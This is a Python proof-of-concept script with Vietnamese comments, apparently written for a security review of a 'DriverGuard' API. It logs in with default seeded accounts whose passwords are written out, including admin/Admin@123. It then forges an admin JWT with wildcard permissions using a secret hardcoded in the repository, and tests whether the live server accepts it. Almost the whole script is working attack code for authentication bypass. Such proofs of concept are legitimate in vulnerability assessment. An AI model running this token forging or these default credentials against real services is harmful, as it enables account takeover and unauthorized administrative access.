#!/usr/bin/env python3
"""
P-136 DriverGuard — PoC:
  (A) Đăng nhập hợp lệ 3 vai trò qua API, lấy token.
  (B) GIẢ MẠO JWT bằng secret hardcode trong repo (src/config.py:
      jwt_secret_key = "<REDACTED_JWT_SECRET>")
      -> nếu server LIVE chấp nhận token tự ký => secret không override => chiếm quyền bất kỳ user.
Chạy: python3 01_login_and_jwt_forge.py
"""
import json, time, sys
import jwt, requests

BASE = "http://<REDACTED_IP>:8000/api/v1"
HARDCODED_SECRET = "<REDACTED_JWT_SECRET>"
ALG = "HS256"
ISS = "driverguard-auth-service"
OUT = "/home/hieubt15/Documents/demo-review-cohort4/reviews/P-136/evidences"

ACCOUNTS = [
    ("admin", "Admin@123"),
    ("manager", "Manager@123"),
    ("driver1", "Driver@123"),
]

def login(username, password):
    r = requests.post(f"{BASE}/auth/login", json={"username": username, "password": password}, timeout=20)
    return r.status_code, r.json() if r.headers.get("content-type","").startswith("application/json") else r.text

def main():
    result = {"ts": time.strftime("%Y-%m-%d %H:%M:%S%z"), "base": BASE, "logins": {}, "forge": {}}

    # (A) Legit logins
    for u, p in ACCOUNTS:
        sc, body = login(u, p)
        uid = None
        role = None
        if isinstance(body, dict) and body.get("data"):
            uid = body["data"].get("user", {}).get("id")
            role = body["data"].get("user", {}).get("role")
        result["logins"][u] = {"status": sc, "user_id": uid, "role": role,
                               "access_token": (body.get("data",{}) or {}).get("access_token") if isinstance(body,dict) else None}
        print(f"[login] {u}: HTTP {sc} id={uid} role={role}")

    # (B) Forge admin token WITHOUT any credentials, using the hardcoded secret.
    now = int(time.time())
    forged_claims = {
        "sub": "usr_admin_0001",          # id admin seed (src/seed.py)
        "username": "attacker-forged",
        "email": "attacker@evil.test",
        "role": "ADMIN",
        "permissions": ["*"],
        "iat": now, "exp": now + 3600,
        "iss": ISS, "token_type": "access",
    }
    forged = jwt.encode(forged_claims, HARDCODED_SECRET, algorithm=ALG)
    result["forge"]["forged_token"] = forged

    r = requests.get(f"{BASE}/auth/me", headers={"Authorization": f"Bearer {forged}"}, timeout=20)
    result["forge"]["me_status"] = r.status_code
    try:
        result["forge"]["me_body"] = r.json()
    except Exception:
        result["forge"]["me_body"] = r.text
    print(f"[forge] GET /auth/me with FORGED admin token -> HTTP {r.status_code}")
    print("  body:", json.dumps(result["forge"]["me_body"], ensure_ascii=False)[:400])

    verdict = "VULNERABLE: server chấp nhận JWT tự ký bằng secret hardcode" if r.status_code == 200 else "Không tái hiện (secret có thể đã override)"
    result["forge"]["verdict"] = verdict
    print("[verdict]", verdict)

    with open(f"{OUT}/01_login_and_jwt_forge.json", "w", encoding="utf-8") as f:
        json.dump(result, f, ensure_ascii=False, indent=2)
    print("saved evidence ->", f"{OUT}/01_login_and_jwt_forge.json")

if __name__ == "__main__":
    main()
